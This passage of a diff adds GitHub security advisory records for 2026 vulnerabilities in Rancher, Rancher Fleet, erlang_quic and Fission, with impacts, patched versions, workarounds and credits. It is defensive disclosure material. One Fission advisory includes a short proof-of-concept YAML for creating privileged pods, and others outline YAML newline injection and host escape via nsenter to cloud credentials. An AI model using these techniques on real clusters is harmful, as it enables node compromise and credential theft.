+      "https://github.com/advisories/GHSA-vx8h-4prv-g744"
+    ],
+    "published_at": "2026-07-01T20:57:49Z",
+    "updated_at": "2026-07-01T20:57:50Z",
+    "github_reviewed_at": "2026-07-01T20:57:49Z",
+    "nvd_published_at": "2026-06-29T16:16:39Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/rancher/rancher"
+        },
+        "vulnerable_version_range": ">= 2.14.0, < 2.14.2",
+        "first_patched_version": "2.14.2",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/rancher/rancher"
+        },
+        "vulnerable_version_range": ">= 2.13.0, < 2.13.6",
+        "first_patched_version": "2.13.6",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/rancher/rancher"
+        },
+        "vulnerable_version_range": ">= 2.12.0, < 2.12.10",
+        "first_patched_version": "2.12.10",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/rancher/rancher"
+        },
+        "vulnerable_version_range": "< 0.0.0-20260513182521-2800aaac25b5",
+        "first_patched_version": "0.0.0-20260513182521-2800aaac25b5",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:H/A:H",
+        "score": 8.4
+      },
+      "cvss_v4": {
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H",
+        "score": 9.4
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-305",
+        "name": "Authentication Bypass by Primary Weakness"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "MMunier",
+          "id": 43609314,
+          "node_id": "MDQ6VXNlcjQzNjA5MzE0",
+          "avatar_url": "https://avatars.githubusercontent.com/u/43609314?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/MMunier",
+          "html_url": "https://github.com/MMunier",
+          "followers_url": "https://api.github.com/users/MMunier/followers",
+          "following_url": "https://api.github.com/users/MMunier/following{/other_user}",
+          "gists_url": "https://api.github.com/users/MMunier/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/MMunier/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/MMunier/subscriptions",
+          "organizations_url": "https://api.github.com/users/MMunier/orgs",
+          "repos_url": "https://api.github.com/users/MMunier/repos",
+          "events_url": "https://api.github.com/users/MMunier/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/MMunier/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "finder"
+      },
+      {
+        "user": {
+          "login": "Trolldemorted",
+          "id": 10261186,
+          "node_id": "MDQ6VXNlcjEwMjYxMTg2",
+          "avatar_url": "https://avatars.githubusercontent.com/u/10261186?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/Trolldemorted",
+          "html_url": "https://github.com/Trolldemorted",
+          "followers_url": "https://api.github.com/users/Trolldemorted/followers",
+          "following_url": "https://api.github.com/users/Trolldemorted/following{/other_user}",
+          "gists_url": "https://api.github.com/users/Trolldemorted/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/Trolldemorted/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/Trolldemorted/subscriptions",
+          "organizations_url": "https://api.github.com/users/Trolldemorted/orgs",
+          "repos_url": "https://api.github.com/users/Trolldemorted/repos",
+          "events_url": "https://api.github.com/users/Trolldemorted/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/Trolldemorted/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "finder"
+      }
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:H/A:H",
+      "score": 8.4
+    },
+    "epss": {
+      "percentage": 0.0031,
+      "percentile": 0.22725
+    }
+  },
+  {
+    "ghsa_id": "GHSA-xr65-5cpm-g36x",
+    "cve_id": "CVE-2026-44935",
+    "url": "https://api.github.com/advisories/GHSA-xr65-5cpm-g36x",
+    "html_url": "https://github.com/advisories/GHSA-xr65-5cpm-g36x",
+    "summary": "Rancher Fleet vulnerable to cross namespace secret disclosure via unvalidated `valuesFrom` references in Helm Deployer",
+    "description": "### Impact\nA vulnerability in Fleet for Rancher Manager affects multi-tenancy environments where different tenants share the same downstream clusters (e.g., different privileged or untrusted teams inside the same organization). \n\nOn unpatched versions, tenants could bypass restrictions to access any config map or secret across all namespaces on the downstream cluster. They can create cluster-wide resources using `HelmOp` or `Bundle` without authorization.\nSpecifically, an attacker can exploit this vulnerability in the following ways:\n1. Use `valuesFrom` in `fleet.yaml`(through a `GitRepo` resource) or a `HelmOp resource to read the contents of any secret an on the downstream cluster, provided they know or can guess the name, namespace, and key.\n2. Deploy `HelmOp` and `Bundle` resources without being restricted to a specific service account for the Fleet agent.\n\nIf you use Fleet in a multi-tenant environment, it's recommended that you:\n- Review your cluster and Fleet deployments logs for indicators of unauthorized access across tenant namespaces.\n- Rotate any service accounts and credentials that might have been exposed.\n\nPlease consult the associated  [MITRE ATT&CK - Technique - Unsecured Credentials](https://attack.mitre.org/techniques/T1552/) for further information about this category of attack.\n\n### Patches\nTo resolve this vulnerability, upgrade to a patched version of Fleet.  The new Policy resource allows you to:\n- Configure `GitRepos`, `HelmOps`, and `Bundles` to require a specific service account for the Fleet agent on downstream clusters used for deployment. The agent uses these designated service accounts for operations, blocking access to unauthorized resources.\n- Restrict `HelmOp` repository and chart URLs by using a regular expression. The regular expression is automatically anchored with `^` and `$`, meaning it must match the entire URL string.\n\nLike `GitRepoRestriction`, a Policy resource must be created in the specific namespace you want to restrict, and it only applies to that namespace.\n\n**Note:** Before applying a policy, ensure that the required service account is available on the downstream clusters and is configured with least-privilege permissions.\n\nPatched versions of Fleet include releases `v0.15.2`, `v0.14.6`, `0.13.11`, and `v0.12.15`.\n\n### Workarounds\nIf you can't upgrade to a fixed version, please make sure that tenants do not have shared access to the same downstream clusters.\n\n### Credits\n\nThis security issue was reported by the following collaborators according to our responsible disclosure policy:\n\n- Radisauskas Arnoldas from NATO and the NATO Cyber Security Centre (NCSC).\n\n### References\nIf you have any questions or comments about this advisory:\n- Reach out to the [SUSE Rancher Security team](https://github.com/rancher/rancher/security/policy) for security related inquiries.\n- Open an issue in the [Rancher](https://github.com/rancher/rancher/issues/new/choose) repository.\n- Verify with our [support matrix](https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/) and [product support lifecycle](https://www.suse.com/lifecycle/).",
+    "type": "reviewed",
+    "severity": "critical",
+    "repository_advisory_url": "https://api.github.com/repos/rancher/fleet/security-advisories/GHSA-xr65-5cpm-g36x",
+    "source_code_location": "https://github.com/rancher/fleet",
+    "identifiers": [
+      {
+        "value": "GHSA-xr65-5cpm-g36x",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-44935",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/rancher/fleet/security/advisories/GHSA-xr65-5cpm-g36x",
+      "https://github.com/advisories/GHSA-xr65-5cpm-g36x"
+    ],
+    "published_at": "2026-07-01T20:45:39Z",
+    "updated_at": "2026-07-01T20:45:42Z",
+    "github_reviewed_at": "2026-07-01T20:45:39Z",
+    "nvd_published_at": null,
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/rancher/fleet"
+        },
+        "vulnerable_version_range": ">= 0.15.0, < 0.15.2",
+        "first_patched_version": "0.15.2",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/rancher/fleet"
+        },
+        "vulnerable_version_range": ">= 0.14.0, < 0.14.6",
+        "first_patched_version": "0.14.6",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/rancher/fleet"
+        },
+        "vulnerable_version_range": ">= 0.13.0, < 0.13.11",
+        "first_patched_version": "0.13.11",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/rancher/fleet"
+        },
+        "vulnerable_version_range": ">= 0.12.0, < 0.12.15",
+        "first_patched_version": "0.12.15",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+        "score": 9.9
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-863",
+        "name": "Incorrect Authorization"
+      }
+    ],
+    "credits": [
+
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+      "score": 9.9
+    }
+  },
+  {
+    "ghsa_id": "GHSA-mhc6-2gfq-xx62",
+    "cve_id": "CVE-2026-44939",
+    "url": "https://api.github.com/advisories/GHSA-mhc6-2gfq-xx62",
+    "html_url": "https://github.com/advisories/GHSA-mhc6-2gfq-xx62",
+    "summary": "Rancher vulnerable to command injection through unsanitized YAML parameter",
+    "description": "### Impact\nA critical command injection vulnerability has been identified in the Rancher Manager cluster import endpoint  `/v3/import/{token}_{clusterId}.yaml` through unsanitized YAML parameters. This endpoint accepts an `authImage` query parameter that is rendered without sanitization into a generated Kubernetes manifest template. By including URL-encoded newlines in the parameter value, an attacker can break out of the `image:` field to inject arbitrary YAML keys and malicious configurations, such as commands to execute malicious containers.\n\nExploitation of this vulnerability requires the following conditions to be met:\n- Attackers must obtain a valid cluster registration token (these tokens may be exposed, for example, through documentation, screenshots, or insecure communication channels).\n- The victim’s cluster operator must execute `kubectl apply` against a maliciously crafted URL. \n\nWhen a victim applies this compromised manifest using `kubectl apply`, a DaemonSet is deployed with the injected configuration. This DaemonSet:\n- Runs on all control-plane nodes with `hostNetwork: true` enabled.\n- Uses the `cattle` service account, which possesses `cluster-admin` privileges.\n- Mounts `/etc/kubernetes` directly from the host.\n- Executes attacker-controlled commands via the injected `command:` field.\n\nAn attacker who successfully exploits this vulnerability could:\n\n- Achieve full control over downstream Kubernetes clusters.\n- Execute arbitrary code on control-plane nodes with elevated privileges.\n- Access sensitive cluster secrets and configurations via the privileged service account.\n- Disrupt cluster operations by manipulating critical control-plane workloads.\n- Establish persistent access through the deployed DaemonSet.\n\n**Note:** If you believe that you might have been impacted by this vulnerability, it's highly advised to review your clusters' logs and deployment logs for signs of malicious deployments and to rotate all service accounts and credentials that might have been exposed in such a scenario.\n\nPlease refer to the associated  [MITRE ATT&CK - Technique - Deploy Container](https://attack.mitre.org/techniques/T1610/) for further information about this category of attack.\n\n### Patches\nThis vulnerability is addressed by validating the `authImage` parameter to ensure it contains only valid OCI image reference characters, rejecting any input containing newlines, whitespace, or other characters that could break YAML syntax.\n\nPatched versions of Rancher include release `v2.14.2`, `v2.13.6`, `v2.12.10`, `v2.11.14` and `v2.10.12`. \n\n### Workarounds\nIf upgrading to a patched version immediately is not feasible, users are encouraged to apply the following workaround: \n\n- Review the `kube-api-auth` DaemonSet: Inspect downstream clusters for the `kube-api-auth` DaemonSet within the `cattle-system` namespace (which targets control-plane nodes). Review this resource configuration carefully for:\n  - Unexpected `command:` or `args:` fields in the container specification.\n  - References to non-standard or suspicious container images.\n  - Any modifications occurring after the initial cluster import.\n- Validate manifest integrity: Before running `kubectl apply` on any import manifests, verify that the source URLs originate from trusted sources and match expected patterns.\n\n### Credits\n\nThis security issue was reported by the following collaborators according to our responsible disclosure policy:\n\n- Radisauskas Arnoldas from NATO and the NATO Cyber Security Centre (NCSC).\n- Michael Wollner from Deutsche Telekom AG.\n\n### References\nIf you have any questions or comments about this advisory:\n- Reach out to the [SUSE Rancher Security team](https://github.com/rancher/rancher/security/policy) for security related inquiries.\n- Open an issue in the [Rancher](https://github.com/rancher/rancher/issues/new/choose) repository.\n- Verify with our [support matrix](https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/) and [product support lifecycle](https://www.suse.com/lifecycle/).",
+    "type": "reviewed",
+    "severity": "critical",
+    "repository_advisory_url": "https://api.github.com/repos/rancher/rancher/security-advisories/GHSA-mhc6-2gfq-xx62",
+    "source_code_location": "https://github.com/rancher/rancher",
+    "identifiers": [
+      {
+        "value": "GHSA-mhc6-2gfq-xx62",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-44939",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/rancher/rancher/security/advisories/GHSA-mhc6-2gfq-xx62",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-44939",
+      "https://github.com/rancher/rancher/commit/2aa77eb283e7451d605fb85e1bd9b1791cd73875",
+      "https://github.com/advisories/GHSA-mhc6-2gfq-xx62"
+    ],
+    "published_at": "2026-07-01T20:44:33Z",
+    "updated_at": "2026-07-01T20:44:33Z",
+    "github_reviewed_at": "2026-07-01T20:44:33Z",
+    "nvd_published_at": "2026-06-19T13:16:30Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/rancher/rancher"
+        },
+        "vulnerable_version_range": ">= 2.14.0, < 2.14.2",
+        "first_patched_version": "2.14.2",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/rancher/rancher"
+        },
+        "vulnerable_version_range": ">= 2.13.0, < 2.13.6",
+        "first_patched_version": "2.13.6",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/rancher/rancher"
+        },
+        "vulnerable_version_range": ">= 2.12.0, < 2.12.10",
+        "first_patched_version": "2.12.10",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/rancher/rancher"
+        },
+        "vulnerable_version_range": ">= 2.11.0, < 2.11.14",
+        "first_patched_version": "2.11.14",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/rancher/rancher"
+        },
+        "vulnerable_version_range": ">= 2.10.0, < 2.10.12",
+        "first_patched_version": "2.10.12",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/rancher/rancher"
+        },
+        "vulnerable_version_range": "< 0.0.0-20260617231817-2aa77eb283e7",
+        "first_patched_version": "0.0.0-20260617231817-2aa77eb283e7",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H",
+        "score": 9.6
+      },
+      "cvss_v4": {
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H",
+        "score": 9.4
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-95",
+        "name": "Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "Ibonok",
+          "id": 37837775,
+          "node_id": "MDQ6VXNlcjM3ODM3Nzc1",
+          "avatar_url": "https://avatars.githubusercontent.com/u/37837775?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/Ibonok",
+          "html_url": "https://github.com/Ibonok",
+          "followers_url": "https://api.github.com/users/Ibonok/followers",
+          "following_url": "https://api.github.com/users/Ibonok/following{/other_user}",
+          "gists_url": "https://api.github.com/users/Ibonok/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/Ibonok/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/Ibonok/subscriptions",
+          "organizations_url": "https://api.github.com/users/Ibonok/orgs",
+          "repos_url": "https://api.github.com/users/Ibonok/repos",
+          "events_url": "https://api.github.com/users/Ibonok/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/Ibonok/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "finder"
+      }
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H",
+      "score": 9.6
+    },
+    "epss": {
+      "percentage": 0.01113,
+      "percentile": 0.61727
+    }
+  },
+  {
+    "ghsa_id": "GHSA-2r8v-p65x-3663",
+    "cve_id": "CVE-2026-49457",
+    "url": "https://api.github.com/advisories/GHSA-2r8v-p65x-3663",
+    "html_url": "https://github.com/advisories/GHSA-2r8v-p65x-3663",
+    "summary": "QUIC has Broken TLS verification",
+    "description": "### Impact\n\nThe QUIC client did not authenticate the server during the TLS 1.3 handshake. The CertificateVerify signature was not checked, the certificate chain was not validated, and the hostname was not compared against the certificate, so `verify` was effectively a no-op on the client. A man-in-the-middle on the network path could present any certificate and impersonate any server, defeating the confidentiality and integrity of the connection. HTTP/3 uses the same client and was equally affected. Handshakes authenticated by a PSK (session resumption) are not affected, because the peer is authenticated by the PSK binder and no certificate is sent.\n\n### Patches\n\nFixed in 1.4.4. The client now verifies the CertificateVerify signature, validates the certificate chain against the trust store (`cacerts` option, the operating system store by default), and checks the hostname. Client `verify` now defaults to on; set `verify => false` to accept any certificate (for example a self-signed test server).\n\n### Workarounds\n\nNone before 1.4.4. `verify => true` had no effect, and inspecting the certificate after connecting does not help because without the signature check the peer is never proven to own the certificate it presents.\n\n### Credit\n\nReported by benmmurphy.",
+    "type": "reviewed",
+    "severity": "critical",
+    "repository_advisory_url": "https://api.github.com/repos/benoitc/erlang_quic/security-advisories/GHSA-2r8v-p65x-3663",
+    "source_code_location": "https://github.com/benoitc/erlang_quic",
+    "identifiers": [
+      {
+        "value": "GHSA-2r8v-p65x-3663",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-49457",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/benoitc/erlang_quic/security/advisories/GHSA-2r8v-p65x-3663",
+      "https://github.com/advisories/GHSA-2r8v-p65x-3663"
+    ],
+    "published_at": "2026-07-01T20:32:34Z",
+    "updated_at": "2026-07-01T20:32:36Z",
+    "github_reviewed_at": "2026-07-01T20:32:34Z",
+    "nvd_published_at": null,
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "erlang",
+          "name": "quic"
+        },
+        "vulnerable_version_range": "<= 1.4.3",
+        "first_patched_version": "1.4.4",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+        "score": 9.1
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-295",
+        "name": "Improper Certificate Validation"
+      },
+      {
+        "cwe_id": "CWE-297",
+        "name": "Improper Validation of Certificate with Host Mismatch"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "benmmurphy",
+          "id": 392520,
+          "node_id": "MDQ6VXNlcjM5MjUyMA==",
+          "avatar_url": "https://avatars.githubusercontent.com/u/392520?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/benmmurphy",
+          "html_url": "https://github.com/benmmurphy",
+          "followers_url": "https://api.github.com/users/benmmurphy/followers",
+          "following_url": "https://api.github.com/users/benmmurphy/following{/other_user}",
+          "gists_url": "https://api.github.com/users/benmmurphy/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/benmmurphy/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/benmmurphy/subscriptions",
+          "organizations_url": "https://api.github.com/users/benmmurphy/orgs",
+          "repos_url": "https://api.github.com/users/benmmurphy/repos",
+          "events_url": "https://api.github.com/users/benmmurphy/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/benmmurphy/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      }
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+      "score": 9.1
+    }
+  },
+  {
+    "ghsa_id": "GHSA-m63v-2g9w-2w6v",
+    "cve_id": "CVE-2026-50566",
+    "url": "https://api.github.com/advisories/GHSA-m63v-2g9w-2w6v",
+    "html_url": "https://github.com/advisories/GHSA-m63v-2g9w-2w6v",
+    "summary": "Fission: Environment Runtime.Container and Builder.Container SecurityContext bypass allows privileged pod creation",
+    "description": "### Summary\n\nA follow-up bypass of the round-4 PodSpec hardening (GHSA-gx55-f84r-v3r7, GHSA-wmgg-3p4h-48x7, GHSA-v455-mv2v-5g92). Those advisories validate and sanitize the `PodSpec` (`spec.runtime.podSpec` / `spec.builder.podSpec` /\n`function.spec.podSpec`), but the Environment CRD also exposes `spec.runtime.container` and `spec.builder.container` — a standalone `Container` merged into the runtime/builder pod whose `SecurityContext` bypassed both layers.\n\n### Details\n\n**Admission-layer gap.** `Environment.Validate()` calls `ValidatePodSpecSafety()` on `Runtime.PodSpec` and `Builder.PodSpec` only. That function takes a `*PodSpec`, so it never inspects the standalone `Runtime.Container.SecurityContext`\nor `Builder.Container.SecurityContext`.\n\n**Merge-layer gap.** `sanitizeContainerSecurityContext()` ran only inside `MergePodSpec()`. The container field is merged via `MergeContainer()`, which did not sanitize. With only `Runtime.Container` set and `Runtime.PodSpec` nil,\n`MergePodSpec` is never invoked, so the sanitizer never ran.\n\nAffected merge sites: poolmgr (`gp_deployment.go`), newdeploy (`newdeploy.go`), and buildermgr (`envwatcher.go`).\n\n#### Proof of concept\n\n```yaml\napiVersion: fission.io/v1\nkind: Environment\nmetadata:\n  name: priv-escape-test\n  namespace: default\nspec:\n  version: 3\n  runtime:\n    image: \"ghcr.io/fission/python-env:latest\"\n    container:\n      name: priv-escape-test\n      securityContext:\n        privileged: true\n  poolsize: 1\n```\n\nThe admission webhook accepts this Environment and the resulting pool pod runs with `privileged: true`. Equivalent bypasses: `allowPrivilegeEscalation: true`, `capabilities.add: [\"SYS_ADMIN\"]`, `capabilities.add:\n[\"NET_ADMIN\",\"SYS_PTRACE\"]`. The same attack applies to `Builder.Container`.\n\n### Impact\n\nA tenant with `environments.fission.io` create/update RBAC can run `privileged` / `allowPrivilegeEscalation` / dangerous-capability containers in the Fission function or builder namespace, scheduled under the executor's high-privilege\nservice account — enabling container-sandbox escape, host filesystem and network access, and potential node- and cluster-level compromise. Identical blast radius to GHSA-gx55-f84r-v3r7.\n\n### Fix\n\nFixed in [#3406](https://github.com/fission/fission/pull/3406) and released in [v1.24.0](https://github.com/fission/fission/releases/tag/v1.24.0).\n\n- **Admission layer (primary defence):** a new `ValidateContainerSafety` in `pkg/apis/core/v1/podspec_safety.go` applies the per-container SecurityContext denylist (`privileged`, `allowPrivilegeEscalation`, dangerous capabilities) to a\nstandalone container, and is called from `Environment.Validate()` for `Runtime.Container` and `Builder.Container`.\n- **Merge layer (defence in depth):** `sanitizeContainerSecurityContext()` is now invoked inside `MergeContainer()` itself, covering all three executor/builder call sites.\n\n### Workarounds\n\n- Restrict Environment create/update RBAC to trusted administrators.\n- Deploy a Kyverno / OPA Gatekeeper policy rejecting dangerous Container SecurityContext on Environment CRDs.\n- Label the function/builder namespaces with `pod-security.kubernetes.io/enforce: restricted`.\n\n### References\n\n- GHSA-gx55-f84r-v3r7, GHSA-wmgg-3p4h-48x7, GHSA-v455-mv2v-5g92 — the round-4 PodSpec fixes this advisory bypasses ([#3391](https://github.com/fission/fission/pull/3391), `e484df84`).",
+    "type": "reviewed",
+    "severity": "critical",
+    "repository_advisory_url": "https://api.github.com/repos/fission/fission/security-advisories/GHSA-m63v-2g9w-2w6v",
+    "source_code_location": "https://github.com/fission/fission",
+    "identifiers": [
+      {
+        "value": "GHSA-m63v-2g9w-2w6v",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-50566",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/fission/fission/security/advisories/GHSA-m63v-2g9w-2w6v",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-50566",
+      "https://github.com/fission/fission/pull/3406",
+      "https://github.com/fission/fission/commit/695d3e97e3a20463ab7c8c081843e69e65e952e5",
+      "https://github.com/fission/fission/releases/tag/v1.24.0",
+      "https://github.com/advisories/GHSA-m63v-2g9w-2w6v"
+    ],
+    "published_at": "2026-06-30T18:20:39Z",
+    "updated_at": "2026-06-30T18:20:39Z",
+    "github_reviewed_at": "2026-06-30T18:20:39Z",
+    "nvd_published_at": "2026-06-10T18:17:13Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/fission/fission"
+        },
+        "vulnerable_version_range": "<= 1.23.0",
+        "first_patched_version": "1.24.0",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+        "score": 9.9
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-250",
+        "name": "Execution with Unnecessary Privileges"
+      },
+      {
+        "cwe_id": "CWE-269",
+        "name": "Improper Privilege Management"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "HiyokoSauna37",
+          "id": 263803677,
+          "node_id": "U_kgDOD7lTHQ",
+          "avatar_url": "https://avatars.githubusercontent.com/u/263803677?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/HiyokoSauna37",
+          "html_url": "https://github.com/HiyokoSauna37",
+          "followers_url": "https://api.github.com/users/HiyokoSauna37/followers",
+          "following_url": "https://api.github.com/users/HiyokoSauna37/following{/other_user}",
+          "gists_url": "https://api.github.com/users/HiyokoSauna37/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/HiyokoSauna37/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/HiyokoSauna37/subscriptions",
+          "organizations_url": "https://api.github.com/users/HiyokoSauna37/orgs",
+          "repos_url": "https://api.github.com/users/HiyokoSauna37/repos",
+          "events_url": "https://api.github.com/users/HiyokoSauna37/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/HiyokoSauna37/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      },
+      {
+        "user": {
+          "login": "sanketsudake",
+          "id": 1511975,
+          "node_id": "MDQ6VXNlcjE1MTE5NzU=",
+          "avatar_url": "https://avatars.githubusercontent.com/u/1511975?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/sanketsudake",
+          "html_url": "https://github.com/sanketsudake",
+          "followers_url": "https://api.github.com/users/sanketsudake/followers",
+          "following_url": "https://api.github.com/users/sanketsudake/following{/other_user}",
+          "gists_url": "https://api.github.com/users/sanketsudake/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/sanketsudake/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/sanketsudake/subscriptions",
+          "organizations_url": "https://api.github.com/users/sanketsudake/orgs",
+          "repos_url": "https://api.github.com/users/sanketsudake/repos",
+          "events_url": "https://api.github.com/users/sanketsudake/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/sanketsudake/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "remediation_developer"
+      }
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+      "score": 9.9
+    },
+    "epss": {
+      "percentage": 0.0029,
+      "percentile": 0.20501
+    }
+  },
+  {
+    "ghsa_id": "GHSA-gx55-f84r-v3r7",
+    "cve_id": "CVE-2026-50564",
+    "url": "https://api.github.com/advisories/GHSA-gx55-f84r-v3r7",
+    "html_url": "https://github.com/advisories/GHSA-gx55-f84r-v3r7",
+    "summary": "Fission Environment CRD podspec passthrough enables hostPID/hostNetwork/privileged pods, node escape",
+    "description": "### Summary\n\nFission's `Environment` CRD exposes `spec.runtime.podSpec` and `spec.builder.podSpec`, which are merged into the Kubernetes pod specs for runtime and builder pods. The merge logic propagated `hostNetwork`, `hostPID`, `hostIPC`, container\n `privileged`, and `serviceAccountName` from the user-supplied podspec with no filtering, and `Environment.Validate` performed no security-relevant checks on these fields.\n\n### Details\n\nA namespace user with `create`/`update` on `environments.fission.io` could produce privileged, host-network, hostPID pods in the Fission function or builder namespace. Because the Helm chart created the `fission-function` and\n`fission-builder` namespaces with no `pod-security.kubernetes.io/enforce` labels, Kubernetes Pod Security Admission did not catch the escape either.\n\nFrom a host-network privileged pod with hostPID, the attacker could `nsenter` into the host, read cloud-metadata credentials, access the container-runtime socket, pivot to other namespaces, and fully compromise the node.\n\n### Impact\n\n`environments.fission.io` create/update RBAC is escalated to node compromise — host filesystem and network access on the scheduling node, and from there potential cluster-wide takeover.\n\n### Fix\n\nFixed in [#3391](https://github.com/fission/fission/pull/3391) and released in [v1.24.0](https://github.com/fission/fission/releases/tag/v1.24.0). Denylist at admission (the primary defence) plus belt-and-braces at the merge layer.\n\n**Admission denylist** 